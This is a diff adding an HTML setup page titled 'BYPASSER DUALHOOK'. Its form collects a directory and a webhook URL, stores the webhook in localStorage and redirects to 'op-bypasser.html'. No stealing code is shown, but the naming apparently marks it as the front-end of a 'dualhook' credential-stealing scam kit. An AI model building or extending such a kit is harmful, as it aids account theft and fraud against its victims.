@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BYPASSER DUALHOOK</title>
+  <style>
+      body {
+          font-family: sans-serif;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          min-height: 100vh;
+          margin: 0;
+          overflow: hidden; /* Prevent scrollbars */
+          background-color: #000; /* Black background */
+          color: #eee; /* Light text for contrast */
+      }
+      #matrixCanvas {
+          position: fixed; /* Position canvas behind content */
+          top: 0;
+          left: 0;
+          z-index: -1; /* Ensure it's in the background */
+      }
+      .container {
+          background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white */
+          backdrop-filter: blur(5px); /* Optional: adds a blur effect behind the container */
+          padding: 30px;
+          border-radius: 8px;
+          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3); /* Darker shadow for black background */
+          width: 100%;
+          max-width: 400px;
+          box-sizing: border-box;
+          position: relative; /* Ensure container is above canvas */
+          z-index: 1;
+          border: 1px solid rgba(0, 255, 0, 0.3); /* Subtle green border */
+      }
+      h1 {
+          text-align: center;
+          color: #0F0; /* Green title */
+          margin-bottom: 25px;
+          text-shadow: 0 0 5px #0F0; /* Glow effect */
+      }
+      .form-group {
+          margin-bottom: 20px;
+      }
+      label {
+          display: block;
+          margin-bottom: 8px;
+          color: #0F0; /* Green labels */
+          font-weight: bold;
+      }
+      input[type="text"] {
+          width: 100%;
+          padding: 12px;
+          border: 1px solid #0F0; /* Green border for inputs */
+          background-color: rgba(0, 0, 0, 0.5); /* Darker input background */
+          color: #0F0; /* Green text in inputs */
+          border-radius: 4px;
+          box-sizing: border-box;
+          font-size: 16px;
+      }
+      input[type="text"]:focus {
+          border-color: #00FF00;
+          outline: none;
+          box-shadow: 0 0 0 3px rgba(0, 255, 0, 0.25);
+      }
+      button {
+          width: 100%;
+          padding: 12px;
+          background-color: #007bff; /* Blue button, can change to green if preferred */
+          color: white;
+          border: none;
+          border-radius: 4px;
+          font-size: 18px;
+          cursor: pointer;
+          transition: background-color 0.2s ease;
+      }
+      button:hover {
+          background-color: #0056b3;
+      }
+  </style>
+</head>
+<body>
+  <canvas id="matrixCanvas"></canvas> <!-- The canvas for the animation -->
+  <div class="container">
+      <h1>BYPASSER DUALHOOK</h1>
+      <form>
+          <div class="form-group">
+              <label for="directory">Directory:</label>
+              <input type="text" id="directory" name="directory" placeholder="Enter directory path (e.g., 'my-bypasser')" required>
+          </div>
+          <div class="form-group">
+              <label for="webhook">Webhook:</label>
+              <input type="text" id="webhook" name="webhook" placeholder="Enter webhook URL for dualhook" required>
+          </div>
+          <button type="submit">Submit</button>
+      </form>
+  </div>
+  <script src="matrix-animation.js"></script> <!-- Link to the animation script -->
+  <script>
+      document.querySelector('form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        const directory = document.getElementById('directory').value;
+        const webhook = document.getElementById('webhook').value;
+
+        // Store the webhook in local storage for the next page
+        localStorage.setItem('dualhookWebhook', webhook);
+
+        // Redirect to the new page. In a real application, 'directory' might be part of the path.
+        // For this static HTML example, we'll redirect to a fixed file.
+        window.location.href = 'op-bypasser.html';
+
+        console.log('Directory submitted:', directory);
+        console.log('Webhook stored:', webhook);
+        console.log('Redirecting to op-bypasser.html');
+      });
+    </script>
+</body>
+</html>
